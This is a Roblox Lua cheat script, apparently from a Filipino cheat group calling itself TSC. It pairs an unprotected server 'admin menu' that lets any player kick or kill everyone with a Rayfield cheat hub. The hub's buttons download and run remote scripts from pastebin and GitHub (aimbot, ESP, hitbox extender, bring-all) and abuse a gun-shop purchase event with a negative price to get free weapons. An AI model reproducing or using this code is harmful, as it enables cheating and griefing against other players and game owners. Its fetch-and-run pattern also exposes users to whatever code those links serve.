-- AUTO ADMIN MENU (No Admin Lock)
-- Ilagay sa ServerScriptService

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")

-- === Gumawa ng RemoteEvents kung wala pa ===
local function getOrCreateEvent(name)
    local ev = ReplicatedStorage:FindFirstChild(name)
    if not ev then
        ev = Instance.new("RemoteEvent")
        ev.Name = name
        ev.Parent = ReplicatedStorage
    end
    return ev
end

local setSkyEvent = getOrCreateEvent("SetSkyEvent")
local kickAllEvent = getOrCreateEvent("KickAllEvent")
local killAllEvent = getOrCreateEvent("KillAllEvent")

-- === SERVER SIDE ===

-- Palit Skybox (fixed ID: 90780358748132)
setSkyEvent.OnServerEvent:Connect(function(player)
    for _, obj in pairs(Lighting:GetChildren()) do
        if obj:IsA("Sky") then obj:Destroy() end
    end

    local newSky = Instance.new("Sky")
    newSky.SkyboxBk = "rbxassetid://90780358748132"
    newSky.SkyboxDn = "rbxassetid://90780358748132"
    newSky.SkyboxFt = "rbxassetid://90780358748132"
    newSky.SkyboxLf = "rbxassetid://90780358748132"
    newSky.SkyboxRt = "rbxassetid://90780358748132"
    newSky.SkyboxUp = "rbxassetid://90780358748132"
    newSky.Parent = Lighting
end)

-- Kick All
kickAllEvent.OnServerEvent:Connect(function(player)
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= player then
            target:Kick("You have been banned by SNTS ON TOP")
        end
    end
end)

-- Kill All
killAllEvent.OnServerEvent:Connect(function(player)
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= player and target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.Health = 0
        end
    end
end)

-- === CLIENT SIDE GUI AUTO-INJECT ===
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Wait()

    local guiScript = Instance.new("LocalScript")
    guiScript.Name = "AdminMenu"

    guiScript.Source = [[
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local player = game.Players.LocalPlayer

        local setSkyEvent = ReplicatedStorage:WaitForChild("SetSkyEvent")
        local kickAllEvent = ReplicatedStorage:WaitForChild("KickAllEvent")
        local killAllEvent = ReplicatedStorage:WaitForChild("KillAllEvent")

        local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        local Frame = Instance.new("Frame", ScreenGui)
        Frame.Size = UDim2.new(0, 220, 0, 170)
        Frame.Position = UDim2.new(0.05, 0, 0.2, 0)
        Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

        -- Skybox Button
        local skyButton = Instance.new("TextButton", Frame)
        skyButton.Size = UDim2.new(1, -10, 0, 40)
        skyButton.Position = UDim2.new(0, 5, 0, 5)
        skyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
        skyButton.Text = "Change Skybox"
        skyButton.TextColor3 = Color3.new(1,1,1)
        skyButton.Font = Enum.Font.SourceSansBold
        skyButton.TextSize = 18
        skyButton.MouseButton1Click:Connect(function()
            setSkyEvent:FireServer()
        end)

        -- Kick All Button
        local kickAllButton = Instance.new("TextButton", Frame)
        kickAllButton.Size = UDim2.new(1, -10, 0, 40)
        kickAllButton.Position = UDim2.new(0, 5, 0, 55)
        kickAllButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        kickAllButton.Text = "Kick All"
        kickAllButton.TextColor3 = Color3.new(1,1,1)
        kickAllButton.Font = Enum.Font.SourceSansBold
        kickAllButton.TextSize = 18
        kickAllButton.MouseButton1Click:Connect(function()
            kickAllEvent:FireServer()
        end)

        -- Kill All Button
        local killAllButton = Instance.new("TextButton", Frame)
        killAllButton.Size = UDim2.new(1, -10, 0, 40)
        killAllButton.Position = UDim2.new(0, 5, 0, 105)
        killAllButton.BackgroundColor3 = Color3.fromRGB(150, 0, 150)
        killAllButton.Text = "Kill All"
        killAllButton.TextColor3 = Color3.new(1,1,1)
        killAllButton.Font = Enum.Font.SourceSansBold
        killAllButton.TextSize = 18
        killAllButton.MouseButton1Click:Connect(function()
            killAllEvent:FireServer()
        end)
    ]]

    guiScript.Parent = player:WaitForChild("PlayerGui")
end)
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "LIBRE LANG NG TSC",
   Icon = 0, -- Icon in Topbar. Can use LuciferIcons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "GAWANG TSC",
   LoadingSubtitle = "GAWANG TSC",
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "TSC ON TOP"
   },

   Discord = {
      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "/j4zxsUtS", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "TSC MAIN CHEAT",
      Subtitle = "LINK NG TSC",
      Note = "TSC ON TOP!", -- Use this to tell the user how to get a key
      FileName = "PASALAMAT KA SA TSC", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"TSC ON TOP!!"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})
local MainTab = Window:CreateTab("MAIN SCRIPT", nil) -- Title, Image
local MainSection = MainTab:CreateSection("Main")

Rayfield:Notify({
   Title = "https://discord.gg/2YRZxHNyt",
   Content = "Thankyou For Using TSC ON TOP  Script",
   Duration = 5,
   Image = nil,
})

local Button = MainTab:CreateButton({
   Name = "INFINITE YIELD [TSC]",
   Callback = function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "GHOST HUB [TSC]",
   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/ GhostHub'))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "MUSIC EXPO [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "ESP [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/hXbTLFMU"))()
   end
})

local Button = MainTab:CreateButton({
   Name = "AIMBOT [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/51X4kjCv"))();
   end,
})

local Button = MainTab:CreateButton({
   Name = "BRING/CARRY ALL [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/fCR9srCE"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "LOOPBRING ALL [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/mevsLxWe"))()
  end,
})

local Button = MainTab:CreateButton({
   Name = "TROLL [TSC]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "HITBOX EXTENDER [TSC]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
   end,
})

local DupeTab = Window:CreateTab("SPAWN GUN", nil) -- Title, Image
local Section = DupeTab:CreateSection("SPAWN GUN")

local Button = DupeTab:CreateButton({
   Name = "ALL CITY SP [TSC]",
   Callback = function()
  local args = {
    [1] = "Silenced Pistol",
    [2] = -1000000
}

game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -10000)
   end,
})

local Button = DupeTab:CreateButton({
   Name = "ALL CITY Glock-17 [TSC]",
   Callback = function()
  local args = {
    [1] = "Silenced Pistol",
    [2] = -1000000
}

game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Glock-17", -10000)
   end,
})

local Button = DupeTab:CreateButton({
   Name = "ALL CITY Glock-19 [TSC]",
   Callback = function()
  local args = {
    [1] = "Silenced Pistol",
    [2] = -1000000
}

game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Glock-19", -10000)
   end,
})

local Button = DupeTab:CreateButton({
   Name = "ALL CITY Desert Deagle [TSC]",
   Callback = function()
  local args = {
    [1] = "Silenced Pistol",
    [2] = -1000000
}

game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Desert Deagle", -10000)
   end,
})

local WTab = Window:CreateTab("FANTASMA PVP", nil) -- Title, Image
local Section = WTab:CreateSection("FANTASMA PVP")

local Button = WTab:CreateButton({
   Name = "FANTASMA PVP [TSC]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/usbkillerx/EZhacker/refs/heads/main/EZhack"))()
   end,
})

local STab = Window:CreateTab("ALADIA PVP", nil) -- Title, Image
local Section = STab:CreateSection("ALADIA PVP")

local Button = STab:CreateButton({
   Name = "ALADIA AIMBOT [TSC]",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/z9u1Tv67"))()
   end,
})
